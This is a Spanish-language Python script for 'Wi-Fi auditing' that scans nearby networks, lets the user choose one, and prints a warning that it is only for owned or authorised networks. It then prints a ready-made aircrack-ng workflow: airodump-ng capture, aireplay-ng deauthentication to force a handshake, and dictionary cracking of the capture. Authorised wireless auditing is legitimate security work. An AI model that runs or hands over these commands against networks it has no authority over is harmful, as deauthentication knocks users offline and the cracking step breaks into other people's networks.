# auditoria_wifi.py

import sys
from utils import es_root, limpiar_texto
from analizador_wifi import escanear_redes, parsear_redes, mostrar_tabla, obtener_interfaz

ROJO     = "\033[91m"
VERDE    = "\033[92m"
AMARILLO = "\033[93m"
RESET    = "\033[0m"


def verificar_root():
    if not es_root():
        print(f"{ROJO}Error: se requieren permisos de administrador.{RESET}")
        print("Ejecuta con: sudo python3 auditoria_wifi.py")
        sys.exit(1)

def elegir_red(redes):
    print(f"\n{AMARILLO}[ Elige la red a auditar ]{RESET}\n")

    # Mostrar tabla con números
    for i, red in enumerate(redes, start=1):
        print(f"  {VERDE}[{i}]{RESET} {red['ssid']:<25} Canal: {red['canal']:<4} Señal: {red['señal_dbm']} dBm  Seguridad: {red['seguridad']}")

    # Pedir selección con validación
    while True:
        try:
            opcion = int(input(f"\n  Selecciona una red [1-{len(redes)}]: "))
            if 1 <= opcion <= len(redes):
                return redes[opcion - 1]
            else:
                print(f"  {ROJO}Número fuera de rango. Intenta de nuevo.{RESET}")
        except ValueError:
            print(f"  {ROJO}Escribe solo el número.{RESET}")


#Advertencia etica

def advertencia_etica():
    print(f"""
{ROJO}╔══════════════════════════════════════════════════════╗
    ║           ADVERTENCIA DE USO RESPONSABLE                  ss ║
    ║                                                            ║
    ║  Esta herramienta es solo para redes propias o             ║
    ║  con autorización del propietario.                         ║
    ╚════════════════════════════════════════════════════════════╝{RESET}
        """)

def generar_comandos(red, interfaz):
    ssid    = red["ssid"]
    canal   = red["canal"]
    
    print(f"\n{VERDE}[ Comandos de auditoría para '{ssid}' ]{RESET}\n")

    print(f"  {AMARILLO}1. Capturar tráfico de la red:{RESET}")
    print(f"     airodump-ng --bssid <MAC> --channel {canal} --write captura {interfaz}\n")

    print(f"  {AMARILLO}2. Enviar desautenticación para capturar handshake:{RESET}")
    print(f"     aireplay-ng --deauth 10 -a <MAC> {interfaz}\n")

    print(f"  {AMARILLO}3. Intentar descifrar con diccionario:{RESET}")
    print(f"     aircrack-ng -w /ruta/diccionario.txt captura*.cap\n")

    print(f"  {ROJO}Nota: reemplaza <MAC> con la dirección del punto de acceso.{RESET}")
    print(f"  Puedes verla en la columna BSSID de airodump-ng.\n")

def main():
    verificar_root()
    advertencia_etica()

    interfaz = obtener_interfaz()
    print(f"\n{VERDE}Interfaz detectada: {interfaz}{RESET}")

    salida_cruda = escanear_redes(interfaz)
    redes = parsear_redes(salida_cruda)

    print(f"\n{VERDE}[ Redes encontradas: {len(redes)} ]{RESET}\n")
    mostrar_tabla(redes)

    red_elegida = elegir_red(redes)
    print(f"\n{VERDE}Red seleccionada: {red_elegida['ssid']}{RESET}")

    generar_comandos(red_elegida, interfaz)

if __name__ == "__main__":
    main()